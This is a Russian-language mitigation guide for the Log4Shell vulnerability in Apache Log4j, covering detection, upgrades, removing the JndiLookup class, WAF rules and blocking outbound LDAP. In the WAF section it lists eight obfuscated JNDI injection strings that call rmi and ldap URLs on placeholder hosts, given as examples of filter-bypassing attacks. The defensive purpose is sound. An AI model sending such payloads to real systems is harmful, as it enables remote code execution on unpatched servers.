# Общее описание

Уязвимость в утилите журналирования Log4j от Apache Software Foundation [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

Уязвимость удаленного выполнения кода под названием Log4Shell получила максимальную оценку в 10 баллов по шкале CVSSv3, поскольку ее можно эксплуатировать удаленно, и особых технических навыков для этого не требуется. Критическая опасность связана с повсеместным присутствием утилиты Log4j почти во всех основных корпоративных приложениях и серверах на базе Java. Проблема затрагивает версии log4j между 2.0-beta-9 и 2.14.1. Уязвимость отсутствует в версии log4j 1 и исправлена в версии 2.15.0[^1]. В версии 2.15.0 по умолчанию был отключен лишь один аспект функционала JNDI по поиску сообщений. Теперь же вышло второе исправление [2.16.0](https://logging.apache.org/log4j/2.x/download.html), по умолчанию отключающее всю поддержку JNDI и полностью удаляющее обработку поиска сообщений.

Выпуск второго обновления был необходим, поскольку версию 2.15.0 по-прежнему можно проэксплуатировать при определенных незаводских конфигурациях. Данная проблема получила собственный идентификатор [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). В связи с этим в версии [2.16.0](https://logging.apache.org/log4j/2.x/download.html) JNDI выключен. JNDI представляет собой API, используемый утилитой Log4j для извлечения объектов с удаленных серверов с целью их использования в записях журнала.

## Обнаружение уязвимой библиотеки

Для анализа проблемы на хосте необходимо выполнить поиск запущенных java процессов, и проверить не используют они уязвимую библиотеку.

!!! info "Для информации"
    Для поиска роль использует скрипт по Python из проекта [fox-it/log4j-finder](https://github.com/fox-it/log4j-finder). Так как в нем используется анализ не по имени файлов, а по md5 суммам версий библиотек. Что в значительной степени повышает надежность обнаружения. В том числе обнаружение идет и в runtime LXC (docker images).

## Устранение уязвимости

### Обновление версии

Очевидное и самое правильное решение обновить версию библиотеки до последнего доступного релиза. Обновление библиотеки выполняется совместно с обновлением приложения. Для этого необходимо дождаться новой версии приложения от разработчика.

!!! attention "Внимание"
    Обновление только библиотеки может привести к полной или частично неработоспособности приложения.

### Временное решение

Это комплекс мер которы снижает риски эксплуатации данной уязвимости, если отсутствует обновление или нет возможности его применить.

!!! attention "Внимание"
    Данные решения не решают проблему полностью, а только снижают риски.

* Удалить возможность Log4j выполнять поиски уязвимых запросов. Эта функция находится в JndiLookup.class, необходимо удалить данный класс из библиотеки Log4j.

!!! example "Удаление класса"
    ``` bash
    zip -q -d <path/filename>.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
    ```

!!! attention "Внимание"
    Также рекомендуется одновременно удалить другие классы, которые также могут быть использованы в этой или подобных атаках. Эти файлы включают JndiManager, JMSAppender и SMTPAppender. Имейте в виду, что удаление классов из среды выполнения может вызвать неожиданное поведение (полную или частичную неработоспособность приложения).

!!! attention "Внимание"
    Роль удаляет только JndiLookup класс из библиотеки.

!!! fail "Особое внимание"
    Не рекомендуется использовать удаление класса, так как может привести к полной или частично неработоспособности приложения.

* Добавьте правила WAF для блокировки вредоносных входящих запросов.

Правила WAF (Web Application Firewall) могут быть добавлены для фильтрации входящих запросов. Вот несколько примеров попыток атак в обход правил:

!!! example "Правила WAF"
    ``` text
    ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}  
    ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}  
    ${jndi:rmi://adsasd.asdasd.asdasd}  
    ${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
    ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
    ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}  
    ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://%s}  
    ```

!!! attention "Внимание"
    Обратите внимание, что на этот подход нельзя полагаться, поскольку злоумышленники каждый час создают новые цепочки атак, которые могут обойти эти правила. Возможно, придется добавить их вручную, новые правила для отклонения запросов на остове ализа журналов WAF, которые выглядят как злонамеренные атаки на эту уязвимость.

* В дополнение к правилам WAF, настроить запрет исходящих соединений по протоколу LDAP на межсетевом экране.

!!! attention "Внимание"
    Блокировать необходимо не LDAP порт, а пакеты протокола LDAP.

## Ansible роль

Для определения используемых уязвимых библиотек и исправления написана ansible роль:

* infra-service.log4j

!!! tip "Подсказка"
    Для создания закладки в браузере на данное руководство: ++ctrl+d++


  [^1]: Устранена частично, остается возможность вызвать отказ в обслуживание (Denial of Service).
 